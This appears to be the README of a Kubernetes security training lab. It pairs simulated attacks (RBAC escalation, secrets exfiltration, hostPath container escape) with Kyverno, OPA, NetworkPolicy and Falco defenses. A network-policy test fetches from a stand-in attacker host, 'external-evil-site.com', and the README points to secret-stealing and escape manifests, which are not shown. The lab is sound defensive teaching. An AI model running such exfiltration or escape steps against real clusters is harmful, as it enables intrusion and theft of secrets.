# Kubernetes Attack & Defense Lab

![K8s Security](https://img.shields.io/badge/Kubernetes-Security-326CE5?logo=kubernetes)
![Security Scanning](https://img.shields.io/github/actions/workflow/status/pawan122003/k8s-attack-defense-lab/security.yml?label=Security%20Checks)
![License](https://img.shields.io/badge/License-MIT-green.svg)
![Kyverno](https://img.shields.io/badge/Kyverno-Policies-00B3FF)
![OPA](https://img.shields.io/badge/OPA-Rego-5EABA7)
![Falco](https://img.shields.io/badge/Falco-Runtime-00AEC7)

> **Hands-on Kubernetes security lab: simulate real-world attacks and implement defense-in-depth strategies**

## 🎯 Overview

This hands-on lab demonstrates comprehensive Kubernetes security through attack simulation and defense implementation. Learn to identify, exploit, and mitigate common K8s vulnerabilities using industry-standard tools.

### What You'll Learn

- **Attack Simulation**: RBAC misuse, secrets exfiltration, hostPath escapes
- **Defense Strategies**: NetworkPolicies, PodSecurity, Admission Control
- **Security Tools**: Kyverno, OPA, Falco, kubescape, kube-linter
- **DevSecOps**: CI/CD security gates, policy-as-code

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                 CI/CD Security Pipeline                      │
├─────────────────────────────────────────────────────────────┤
│  kubeconform → kubescape → kube-linter → Kyverno → OPA     │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│              Kind Cluster (Local K8s)                        │
├─────────────────────────────────────────────────────────────┤
│  • Attack Scenarios      • Admission Policies               │
│  • Network Policies      • Falco Runtime Monitoring         │
│  • Pod Security          • RBAC Hardening                   │
└─────────────────────────────────────────────────────────────┘
```

## 📁 Project Structure

```
k8s-attack-defense-lab/
├── attacks/
│   ├── rbac-misuse/           # Overprivileged service accounts
│   ├── secrets-exfil/         # Secret extraction attacks
│   └── hostpath-escape/       # Container breakout via hostPath
├── defenses/
│   ├── networkpolicies/       # Network segmentation
│   └── podsecurity/           # Pod Security Standards
├── policies/
│   ├── kyverno/               # Kyverno admission policies
│   └── opa/                   # OPA Rego policies
├── monitors/
│   └── falco/                 # Falco runtime detection rules
├── cluster/
│   └── kind-config.yaml       # Kind cluster configuration
├── .github/workflows/
│   └── security.yml           # CI security pipeline
├── scripts/
│   ├── install_tools.sh       # Setup security tools
│   └── run_attack_suite.sh    # Execute attack scenarios
├── docs/
│   ├── attacks.md             # Attack documentation
│   └── defenses.md            # Defense guide
└── .devcontainer/
    └── devcontainer.json      # Codespaces configuration
```

## 🚀 Quick Start

### Prerequisites

- Docker Desktop
- kubectl >= 1.28
- Kind >= 0.20
- Helm >= 3.12

### Installation

```bash
# Clone the repository
git clone https://github.com/pawan122003/k8s-attack-defense-lab.git
cd k8s-attack-defense-lab

# Install security tools
bash scripts/install_tools.sh

# Create Kind cluster with custom config
kind create cluster --config cluster/kind-config.yaml --name attack-defense

# Deploy admission controllers
kubectl apply -f policies/kyverno/
kubectl apply -f policies/opa/

# Install Falco for runtime monitoring
helm install falco falcosecurity/falco -f monitors/falco/values.yaml
```

## 🚢 Codespaces & Dev Container

Launch instantly with a pre-configured environment:

1. Click **Code** → **Codespaces** → **Create codespace**
2. Wait for container initialization (~2-3 minutes)
3. All tools are pre-installed: kubectl, kind, helm, kyverno CLI, kubescape

## ⚔️ Attack Scenarios

### 1. RBAC Privilege Escalation

**Attack**: Exploit overly permissive service account to gain cluster-admin

```bash
kubectl apply -f attacks/rbac-misuse/overprivileged-sa.yaml
kubectl exec -it attacker-pod -- /bin/bash
# Inside pod: escalate privileges
```

**Defense**: Implement least-privilege RBAC + Kyverno policy

```bash
kubectl apply -f defenses/rbac/least-privilege.yaml
kubectl apply -f policies/kyverno/require-drop-capabilities.yaml
```

### 2. Secrets Exfiltration

**Attack**: Mount all secrets and exfiltrate to external endpoint

```bash
kubectl apply -f attacks/secrets-exfil/secret-stealer.yaml
```

**Defense**: NetworkPolicy + OPA admission control

```bash
kubectl apply -f defenses/networkpolicies/deny-egress.yaml
kubectl apply -f policies/opa/restrict-secret-volumes.rego
```

### 3. Container Escape via hostPath

**Attack**: Mount host filesystem and escape container

```bash
kubectl apply -f attacks/hostpath-escape/host-mounter.yaml
```

**Defense**: Pod Security Standards (Restricted) + Kyverno

```bash
kubectl label namespace default pod-security.kubernetes.io/enforce=restricted
kubectl apply -f policies/kyverno/disallow-host-path.yaml
```

## 🛡️ Defense Capabilities

### Admission Control

- **Kyverno Policies**:
  - Require security labels
  - Disallow `:latest` images
  - Enforce resource limits
  - Drop dangerous capabilities
  - Restrict hostPath volumes

- **OPA Policies**:
  - Pod Security Standards baseline
  - Network policy enforcement
  - Secret mounting restrictions

### Network Segmentation

```bash
# Default deny-all policy
kubectl apply -f defenses/networkpolicies/default-deny.yaml

# Allow only necessary traffic
kubectl apply -f defenses/networkpolicies/allow-frontend-to-backend.yaml
```

### Runtime Monitoring

Falco rules detect:
- Unexpected container shell spawns
- Sensitive file access
- Privilege escalation attempts
- Network connections to suspicious IPs

## 📊 CI/CD Security Pipeline

The GitHub Actions workflow (`.github/workflows/security.yml`) runs:

1. **Manifest Validation**: kubeconform
2. **Security Scanning**: kubescape (NSA/CISA hardening guide)
3. **Best Practices**: kube-linter
4. **Policy Validation**: Kyverno CLI dry-run
5. **OPA Testing**: OPA test suite

## 🛠️ Security Tools

| Category | Tools |
|----------|-------|
| Admission Control | Kyverno, OPA Gatekeeper |
| Security Scanning | kubescape, kube-linter, kubeconform |
| Runtime Security | Falco |
| Network Security | Calico NetworkPolicies |
| RBAC | kubectl-who-can, rback |

## 🧪 Running the Lab

### Full Attack Suite

```bash
# Run all attack scenarios
bash scripts/run_attack_suite.sh

# View results
kubectl get events --sort-by='.lastTimestamp'
kubectl logs -n falco -l app=falco
```

### Manual Testing

```bash
# Test admission policies
kubectl apply -f attacks/rbac-misuse/malicious-pod.yaml
# Should be denied by Kyverno/OPA

# Test network policies
kubectl run test-pod --image=busybox -- sleep 3600
kubectl exec test-pod -- wget -O- http://external-evil-site.com
# Should fail due to NetworkPolicy
```

## 📈 Metrics & Monitoring

- **Policy Violations**: Track Kyverno/OPA denials
- **Runtime Alerts**: Falco security events
- **Attack Success Rate**: Test defense effectiveness
- **Response Time**: Time to detect and block attacks

## 🤝 Contributing

1. Fork the repository
2. Create attack/defense scenarios
3. Add detection rules (Falco/OPA/Kyverno)
4. Submit pull request with documentation

## 📚 Resources

- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
- [Kyverno Documentation](https://kyverno.io/docs/)
- [OPA Gatekeeper](https://open-policy-agent.github.io/gatekeeper/)
- [Falco Rules](https://falco.org/docs/rules/)

## 📝 License

MIT License - see [LICENSE](LICENSE) file

## 👤 Author

**Pawan Bharambe**
- DevOps Engineer specializing in Kubernetes & Cloud Security
- GitHub: [@pawan122003](https://github.com/pawan122003)
- Focus: Container Security, Policy-as-Code, DevSecOps

## ⭐ Show Your Support

Give a ⭐ if this lab helped you learn Kubernetes security!

---

**⚠️ Warning**: This is a lab environment for educational purposes. Do not deploy these attack scenarios in production environments.
